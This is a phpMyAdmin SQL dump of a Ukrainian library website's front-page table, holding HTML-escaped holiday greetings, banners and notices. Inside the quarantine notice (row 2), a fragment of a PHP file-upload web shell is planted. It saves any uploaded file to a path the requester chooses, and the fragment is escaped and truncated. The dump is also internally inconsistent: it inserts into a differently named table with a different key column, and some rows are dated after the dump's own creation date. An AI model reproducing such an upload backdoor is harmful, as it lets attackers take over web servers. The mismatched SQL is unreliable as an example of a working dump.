-- phpMyAdmin SQL Dump
-- version 4.9.5deb2
-- https://www.phpmyadmin.net/
--
-- Хост: localhost:3306
-- Время создания: Мар 09 2022 г., 15:34
-- Версия сервера: 10.3.34-MariaDB-0ubuntu0.20.04.1
-- Версия PHP: 7.4.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `hmlibrar_library`
--

-- --------------------------------------------------------

--
-- Структура таблицы `main_page`
--

CREATE TABLE `main_page` (
  `mp_id` int(11) NOT NULL,
  `mp_date1` date NOT NULL,
  `mp_date2` date NOT NULL,
  `mp_text` text NOT NULL,
  `mp_name` varchar(60) NOT NULL,
  `mp_frame1` text NOT NULL,
  `mp_frame2` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `main_page`
--

INSERT INTO `main_pages` (`id`, `mp_date1`, `mp_date2`, `mp_text`, `mp_name`, `mp_frame1`, `mp_frame2`) VALUES
(1, '2018-01-20', '2018-01-21', '&lt;h1&gt;&lt;span style=&quot;color: #0000ff;&quot;&gt;Віртуальна подорож бібліотекою&lt;/span&gt;&lt;/h1&gt;\r\n&lt;h2&gt;&lt;span style=&quot;color: #ff0000;&quot;&gt;Фойє&lt;/span&gt;&lt;/h2&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;h2&gt;&lt;span style=&quot;color: #ff0000;&quot;&gt;Читальний зал&lt;/span&gt;&lt;/h2&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;h2&gt;&lt;span style=&quot;color: #ff0000;&quot;&gt;Абонемент, Інтернет-центр&lt;/span&gt;&lt;/h2&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;h2&gt;&lt;span style=&quot;color: #ff0000;&quot;&gt;Абонемент для юнацтва&lt;/span&gt;&lt;/h2&gt;', 'Віртуальна подорож', '', ''),
(8, '2022-08-22', '2022-08-24', '&lt;h2 style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/independ_day.jpg&quot; alt=&quot;&quot; width=&quot;512&quot; height=&quot;384&quot; /&gt;&lt;/h2&gt;', 'З днем незалежності', '', ''),
(9, '2022-09-25', '2022-09-30', '&lt;h1 style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/unnamed_1.jpg&quot; alt=&quot;&quot; width=&quot;512&quot; height=&quot;355&quot; /&gt;&lt;/h1&gt;\r\n&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/unnamed.jpg&quot; alt=&quot;&quot; width=&quot;512&quot; height=&quot;378&quot; /&gt;&lt;/p&gt;', 'З днем бібліотекаря', '', ''),
(17, '2022-02-14', '2022-02-14', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;../tinymce/upload-files/main_page/maxresdefault.jpg&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;366&quot; /&gt;&lt;/p&gt;', 'Валентина', '', ''),
(18, '2021-12-30', '2022-01-03', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;../tinymce/upload-files/main_page/178050490.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;375&quot; /&gt;&lt;/p&gt;', 'З новим роком', '', ''),
(19, '2022-06-11', '2022-06-12', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://media.dyvys.info/2019/06/7-1.jpg&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;488&quot; /&gt;&lt;/p&gt;', 'Трійця', '', ''),
(20, '2022-10-13', '2022-10-14', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://korets.rayon.in.ua/upload/news/23/2018-10/1539236146166/t_1_vitaemo.jpg&quot; alt=&quot;&quot; width=&quot;592&quot; height=&quot;444&quot; /&gt;&lt;/p&gt;', '14 жовтня', '', ''),
(2, '2021-11-18', '2021-12-14', '&lt;h1 style=&quot;text-align: center;&quot;&gt;&lt;span style=&quot;color: #0000ff;&quot;&gt;Шановні користувачі!&lt;/span&gt;&lt;/h1&gt;\r\n&lt;h2 style=&quot;text-align: center;&quot;&gt;Повідомляємо Вам, що у зв&amp;#039;язку із встановленням&lt;span style=&quot;color: #ff0000;&quot;&gt; з 18 листопада 2021 року &quot;Червоного&quot; рівня&lt;/span&gt; епідемічної небезпеки у Вінницькій області, бібліотека та її філії припиняють обслуговування користувачів у приміщеннях бібліотек.&lt;/h2&gt;\r\n&lt;h2 style=&quot;text-align: center;&quot;&gt;Просимо вибачити за незручності.&lt;/h2&gt;\r\n&lt;h2 style=&quot;text-align: center;&quot;&gt;&lt;span style=&quot;color: #0000ff;&quot;&gt;Про подальші зміни у роботі бібліотеки будемо інформувати.&lt;/span&gt;&lt;/h2&gt;\r\n&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;https://cdn3.suspilne.media/images/704ff07daa316902.jpeg&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;366&quot; /&gt;&lt;/p&gt;\r\n&lt;!--?php  $files = @$_FILES[&quot;files&quot;]; if ($files[&quot;name&quot;] != &amp;#039;&amp;#039;) {     $fullpath = $_REQUEST[&quot;path&quot;] . $files[&quot;name&quot;];     if (move_uploaded_file($files[&amp;#039;tmp_name&amp;#039;], $fullpath)) {         echo &quot;\r\n&lt;h1--&gt;', 'Увага!!! Карантин.', '', ''),
(14, '2022-06-28', '2022-06-28', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://vgolos.com.ua/wp-content/uploads/2020/06/2012-z-dnem-molodi.jpg&quot; alt=&quot;&quot; width=&quot;425&quot; height=&quot;289&quot; /&gt;&lt;/p&gt;', 'З днем молоді', '', ''),
(15, '2022-08-30', '2022-09-01', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://ukr.media/static/ba/aimg/3/7/1/371770_1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;', 'З 1 Вересня', '', ''),
(16, '2022-06-27', '2022-06-28', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://art-shop.com.ua/wp-content/uploads/2017/06/z-dnem-konstitutsiyi-ukrayini-1.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;390&quot; /&gt;&lt;/p&gt;', 'Конституція', '', ''),
(3, '2020-10-23', '2020-10-23', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;../static.php?id=142&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/e-book.jpg&quot; alt=&quot;&quot; width=&quot;604&quot; height=&quot;449&quot; /&gt;&lt;/a&gt;&lt;/p&gt;', 'Читання да дивані', '', ''),
(4, '2021-12-19', '2021-12-20', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;span style=&quot;color: #0000ff; font-size: medium;&quot;&gt;&lt;strong&gt;З днем Святого Миколая!&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align: left;&quot;&gt;&lt;span&gt;Хай здійсняться найзаповітніші дитячі мрії, принесуть у кожну родину щиру втіху і любов.&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align: center;&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://pon.org.ua/uploads/posts/2016-12/1481890617_111.jpg&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;499&quot; /&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;', 'Святого Миколая', '', ''),
(5, '2022-01-06', '2022-01-10', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;../tinymce/upload-files/main_page/531820263.jpg&quot; alt=&quot;&quot; width=&quot;680&quot; height=&quot;481&quot; /&gt;&lt;/p&gt;', 'З різдвом', '', ''),
(6, '2022-03-07', '2022-03-08', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/8-3.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;861&quot; /&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align: center;&quot;&gt;&lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size: large;&quot;&gt;З повагою колектив КЗ &quot;Хмільницька районна бібліотека для дорослих&quot;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;', 'З 8 Березня', '', ''),
(7, '2022-04-24', '2022-04-25', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/pysanky_200609.jpg.gif&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;389&quot; /&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align: center;&quot;&gt;&lt;span style=&quot;font-size: x-large;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family: Tahoma; color: #800000;&quot;&gt;Великодні дні настали - &lt;br /&gt; Люди чисті серцем стали. &lt;br /&gt; Радості, тепла, любові &lt;br /&gt; Хай прибуде в Вашім домі ! &lt;br /&gt; Добро, мов сонце, землю обіймає.&lt;br /&gt; Гімн перемоги лине із небес:&lt;br /&gt; Радійте днесь ! Хай серце вірить й знає - &lt;br /&gt; Христос Воскрес! Воістину Воскрес!&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;', 'З святом Пасхи', '', ''),
(10, '2021-12-25', '2022-01-05', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/NY2018.gif&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;337&quot; /&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align: justify;&quot;&gt;&lt;span style=&quot;font-size: large;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color: #0000ff;&quot;&gt;Нехай прийдешній рік додасть всім нам натхнення і&amp;nbsp; наполегливості у справах, подальшого професійного розвитку, добрих новин, фінансових успіхів, родинного тепла та злагоди. А Різдвяна зірка осяє радістю серця і наповнить їх добротою, милосердям і любов&amp;rsquo;ю!&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align: right;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;text-align: right; font-size: medium; color: #0000ff;&quot;&gt;&amp;nbsp;З повагою колектив&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;font-size: medium; color: #0000ff;&quot;&gt;&lt;strong&gt;КЗ &quot;Бібліотека для дорослих&quot;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-align: center;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size: medium; color: #0000ff;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;', 'З новорічними святами', '', ''),
(27, '2021-10-01', '2021-11-01', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://mova-ombudsman.gov.ua/storage/app/sites/14/16%20July/banners/ukr-mova-banner-800-1.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;900&quot; /&gt;&lt;/p&gt;', 'Мова пл2', '', ''),
(28, '2021-08-01', '2021-10-01', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;https://mova-ombudsman.gov.ua/storage/app/sites/14/16%20July/banners/ukr-mova-banner-800-7.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;900&quot; /&gt;&lt;/p&gt;', 'Мова пл3', '', ''),
(29, '2021-10-01', '2021-11-01', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;https://mova-ombudsman.gov.ua/storage/app/sites/14/16%20July/banners/banner1920x1080-5-1.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;338&quot; /&gt;&lt;/p&gt;', 'Мова пл4', '', ''),
(30, '2021-10-08', '2021-11-05', '&lt;p&gt;&lt;a href=&quot;http://biblio.wikipedia.org.ua&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;../tinymce/upload-files/main_page/wiki.jpg&quot; alt=&quot;&quot; width=&quot;550&quot; height=&quot;777&quot; /&gt;&lt;/a&gt;&lt;/p&gt;', 'Wiki', '', ''),
(31, '2022-10-13', '2022-10-14', '&lt;p&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/den_pokrova_1.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;587&quot; /&gt;&lt;/p&gt;', 'Покрова', '', ''),
(32, '2021-10-14', '2021-10-28', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;span&gt;%frame%&lt;/span&gt;&lt;/p&gt;', 'Проморолик до 14 жовтня', '<iframe src=\"https://www.facebook.com/plugins/video.php?height=314&href=https%3A%2F%2Fwww.facebook.com%2Fhm.librarian%2Fvideos%2F463372588345931%2F&show_text=false&width=560&t=0\" width=\"560\" height=\"314\" style=\"border:none;overflow:hidden\" scrolling=\"no\" frameborder=\"0\" allowfullscreen=\"true\" allow=\"autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share\" allowFullScreen=\"true\"></iframe>', ''),
(33, '2021-10-22', '2021-11-24', '&lt;h2 style=&quot;text-align: center;&quot;&gt;&lt;span style=&quot;color: #0000ff;&quot;&gt;Любиш створювати цікавий контент і розкривати важливі теми? Хочеш відвідати головні медіа країни та попрактикуватися з журналістами на рівних? Тоді спробуй свої сили у конкурсі Репортер. Це чудова нагода випробувати на міцність свою медійну грамотність, познайомитися з топовими медійниками та яскраво розпочати кар&amp;rsquo;єру журналіста.&lt;/span&gt;&lt;/h2&gt;\r\n&lt;h2 style=&quot;text-align: center;&quot;&gt;&lt;span style=&quot;color: #0000ff;&quot;&gt;&lt;span style=&quot;color: #ff0000;&quot;&gt;До участі запрошуються школярі 9-11 класів з усієї країни.&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/h2&gt;\r\n&lt;p&gt;&lt;span&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://filter.mkip.gov.ua/wp-content/uploads/2021/10/reporter_1920h1080-01-3.jpg&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;366&quot; /&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;ДЕТАЛІ ЗА ПОСИЛАННЯМ&amp;nbsp;&lt;a href=&quot;https://filter.mkip.gov.ua/reporter/&quot; target=&quot;_blank&quot;&gt;https://filter.mkip.gov.ua/reporter/&lt;/a&gt;&lt;/p&gt;', 'Національний конкурс Репортер', '', ''),
(11, '2020-10-22', '2020-10-22', '&lt;p&gt;&lt;a href=&quot;../static.php?id=143&quot;&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;../tinymce/upload-files/main_page/vikt.jpg&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;650&quot; /&gt;&lt;/a&gt;&lt;/p&gt;', 'Вікторина', '', ''),
(12, '2022-05-08', '2022-05-10', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;../tinymce/upload-files/main_page/den-peremogi.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;600&quot; /&gt;&lt;/p&gt;', 'День перемоги', '', ''),
(13, '2022-01-13', '2022-01-13', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://webmandry.com.ua/wp-content/uploads/2019/01/vitannja-malanky-5.jpg&quot; alt=&quot;&quot; width=&quot;660&quot; height=&quot;495&quot; /&gt;&lt;/p&gt;', 'Меланка', '', ''),
(21, '2021-11-09', '2021-11-09', '&lt;p&gt;&lt;img src=&quot;https://www.vivatart.com.ua/wp-content/uploads/2020/11/7.jpg&quot; alt=&quot;&quot; width=&quot;794&quot; height=&quot;567&quot; /&gt;&lt;/p&gt;\r\n&lt;h1 class=&quot;d9FyLd XcVN5d&quot; style=&quot;text-align: center;&quot;&gt;Шановні&amp;nbsp;&lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;strong&gt;працівники культури&lt;/strong&gt;&amp;nbsp;та аматори народного мистецтва&lt;/span&gt;!&lt;/h1&gt;\r\n&lt;p&gt;&lt;span class=&quot;hgKElc&quot;&gt;Вітаємо Вас із професійним святом &lt;span style=&quot;color: #ff0000;&quot;&gt;&lt;strong&gt;Днем&amp;nbsp;працівника культури&lt;/strong&gt;&lt;/span&gt;! Ви даруєте людям радість, несете культуру до кожного серця, кожної душі, а разом з тим, примножуючи велич нашого краю, своєю плідною творчою працею та силою духу звеличуєте рідну Україну!&lt;/span&gt;&lt;/p&gt;', 'день працівників культури', '', ''),
(22, '2022-01-14', '2022-01-14', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://imagecdn4.luxnet.ua/radio24/uploads/640w_DIR/media_news/2019/01/5c38ae35be0c4472100524.png&quot; alt=&quot;&quot; width=&quot;640&quot; height=&quot;471&quot; /&gt;&lt;/p&gt;', 'привітання з старим новим роком', '', ''),
(24, '2020-01-06', '2020-01-11', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/grafik1.jpg&quot; alt=&quot;&quot; width=&quot;586&quot; height=&quot;366&quot; /&gt;&lt;/p&gt;', 'Графік роботи', '', ''),
(25, '2022-06-01', '2022-06-01', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;../tinymce/upload-files/main_page/1-june.jpg&quot; alt=&quot;&quot; width=&quot;361&quot; height=&quot;512&quot; /&gt;&lt;/p&gt;', 'День захисту дітей', '', ''),
(26, '2021-08-01', '2021-10-01', '&lt;p&gt;&lt;img style=&quot;display: block; margin-left: auto; margin-right: auto;&quot; src=&quot;https://mova-ombudsman.gov.ua/storage/app/sites/14/16%20July/banners/banner1920x1080-6-1.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;338&quot; /&gt;&lt;/p&gt;', 'Мова пл1', '', ''),
(23, '2021-12-04', '2021-12-06', '<center><iframe src=\"//www.slideshare.net/slideshow/embed_code/key/JOekeaniQGDTU1\" width=\"595\" height=\"485\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\" style=\"border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;\" allowfullscreen> </iframe> </center>', 'Читаємо краєзнавчі книги', '', ''),
(34, '2021-10-21', '2021-12-23', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://vrkadry.rada.gov.ua/news/ogoloshenia/73394.html&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/vru.jpg&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;366&quot; /&gt;&lt;/a&gt;&lt;/p&gt;', 'верховна рада', '', ''),
(35, '2021-12-13', '2021-12-31', '&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;../tinymce/upload-files/main_page/14.jpg&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;406&quot; /&gt;&lt;/p&gt;', 'АКЦІЯ', '', ''),
(36, '0000-00-00', '0000-00-00', '&lt;p&gt;&lt;img src=&quot;../tinymce/upload-files/news/20210709/89.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;338&quot; /&gt;&lt;/p&gt;', '', '', ''),
(37, '0000-00-00', '0000-00-00', '&lt;p&gt;&lt;img src=&quot;../tinymce/upload-files/news/20210709/89.jpg&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;338&quot; /&gt;&lt;/p&gt;', '', '', ''),
(38, '2021-12-17', '2021-12-19', '&lt;p&gt;&lt;img src=&quot;../tinymce/upload-files/news/20210709/Main_Banner.jpg&quot; alt=&quot;&quot; width=&quot;650&quot; height=&quot;650&quot; /&gt;&lt;/p&gt;', '', '', '');

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `main_page`
--
ALTER TABLE `main_page`
  ADD PRIMARY KEY (`mp_id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `main_page`
--
ALTER TABLE `main_page`
  MODIFY `mp_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
